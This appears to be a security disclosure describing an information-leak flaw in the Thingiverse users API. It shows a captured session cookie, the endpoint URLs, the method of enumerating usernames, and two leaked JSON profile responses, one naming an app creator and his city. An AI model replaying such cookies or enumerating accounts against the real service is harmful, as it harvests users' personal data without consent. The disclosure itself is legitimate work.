# About Thingiverse Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie:_cfuvid=4N5qYb626LMdwIb1nOTsKW.IrFXUC9bfKqznyIGEEMk-1712103440804-0.0.1.1-604800000; path=/; domain=.thingiverse.com; HttpOnly; Secure; SameSite=None
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: username, email, country, registration date, etc.

> Request method: GET, information can be obtained by traversing the constructed username, such as "yizhimuzhu666","Albort"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params     |
|---|---|--------------------|
|Yizhimuzhu666|https://api.thingiverse.com/users/yizhimuzhu666?t=1712102338737| name=yizhimuzhu666 |
|Albort|https://api.thingiverse.com/users/Albort?t=1712102338737| name=Albort        |


### Leaked packet cases 
yizhimuzhu666:
``` {
 "id": 7894507,
    "name": "yizhimuzhu666",
    "first_name": "*****",
    "last_name": "****",
    "full_name": "******",
    "email": "example@email.com",
    "url": "https:\/\/api.thingiverse.com\/users\/yizhimuzhu666",
    "public_url": "https:\/\/www.thingiverse.com\/yizhimuzhu666",
    "thumbnail": "https:\/\/cdn.thingiverse.com\/site\/img\/default\/avatar\/avatar_maker_thumb_medium.jpg",
    "bio": "",
    "level": 10,
    "bio_html": "<div><\/div>\n",
    "location": "\u7f8e\u56fd",
    "country": "United States",
    "registered": "2024-03-30T10:37:12+00:00",
    "last_active": "2024-04-03T00:17:18+00:00",
    "cover_image": "https:\/\/cdn.thingiverse.com\/site\/img\/default\/cover\/cover-4_preview_large.jpg",
    "things_url": "https:\/\/api.thingiverse.com\/users\/yizhimuzhu666\/things",
    "copies_url": "https:\/\/api.thingiverse.com\/users\/yizhimuzhu666\/copies",
    "likes_url": "https:\/\/api.thingiverse.com\/users\/yizhimuzhu666\/likes",
    "printers": [
        {
            "id": 13,
            "name": "AW3D XL",
            "public_url": "AW3D XL"
        }
    ],
    "programs": [
        {
            "id": 28,
            "name": "Illustrator"
        }
    ],
    "types": [
        {
            "id": 7,
            "name": "Maker"
        },
        {
            "id": 11,
            "name": "Engineer"
        },
        {
            "id": 2,
            "name": "Artist"
        }
    ],
    "skill_level": "",
    "accepts_tips": false,
    "groups": [],
    "website": "",
    "twitter": null,
    "count_of_followers": 0,
    "count_of_following": 0,
    "count_of_designs": 0,
    "collection_count": 1,
    "make_count": 0,
    "like_count": 3,
    "has_favorite": false,
    "favorite_count": 0,
    "is_admin": false,
    "is_moderator": false,
    "default_license": "cc-sa",
    "current_app": {
        "id": 1926,
        "name": "Thingiverse NEXT",
        "url": "https:\/\/api.thingiverse.com\/apps\/1926",
        "public_url": "https:\/\/www.thingiverse.com\/app:1926",
        "thumbnail": "https:\/\/cdn.thingiverse.com\/site\/img\/default\/Gears_thumb_medium.jpg",
        "creator": {
            "id": 1193737,
            "name": "tjhorner",
            "first_name": "TJ",
            "last_name": "Horner",
            "url": "https:\/\/api.thingiverse.com\/users\/tjhorner",
            "public_url": "https:\/\/www.thingiverse.com\/tjhorner",
            "thumbnail": "https:\/\/cdn.thingiverse.com\/assets\/f0\/80\/7c\/24\/22\/me.jpg",
            "count_of_followers": 26,
            "count_of_following": 3,
            "count_of_designs": 11,
            "collection_count": 2,
            "make_count": 4,
            "accepts_tips": true,
            "is_following": false,
            "location": "Brooklyn, NY",
            "cover": "https:\/\/cdn.thingiverse.com\/assets\/5e\/52\/83\/6b\/f4\/filament_jam.jpg",
            "is_admin": false,
            "is_moderator": false
        },
        "is_published": false,
        "is_approved": false
    }
```
Albort:
``` {
 "id": 5500300,
    "name": "Albort",
    "first_name": "*****",
    "last_name": "*****",
    "full_name": "*****",
    "email": "",
    "url": "https:\/\/api.thingiverse.com\/users\/Albort",
    "public_url": "https:\/\/www.thingiverse.com\/Albort",
    "thumbnail": "https:\/\/cdn.thingiverse.com\/site\/img\/default\/avatar\/avatar_default_thumb_medium.jpg",
    "bio": "",
    "level": 10,
    "bio_html": "<div><\/div>\n",
    "location": "",
    "country": "",
    "registered": "2023-04-10T09:30:45+00:00",
    "last_active": "2023-04-10T09:30:45+00:00",
    "cover_image": "https:\/\/cdn.thingiverse.com\/site\/img\/default\/cover\/cover-1_preview_large.jpg",
    "things_url": "https:\/\/api.thingiverse.com\/users\/Albort\/things",
    "copies_url": "https:\/\/api.thingiverse.com\/users\/Albort\/copies",
    "likes_url": "https:\/\/api.thingiverse.com\/users\/Albort\/likes",
    "printers": [],
    "programs": [],
    "types": [],
    "skill_level": "",
    "accepts_tips": false,
    "groups": [],
    "website": "",
    "twitter": null,
    "count_of_followers": 0,
    "count_of_following": 0,
    "count_of_designs": 0,
    "collection_count": 1,
    "make_count": 0,
    "like_count": 0,
    "has_favorite": false,
    "favorite_count": 0,
    "is_admin": false,
    "is_moderator": false,
    "is_following": false
```
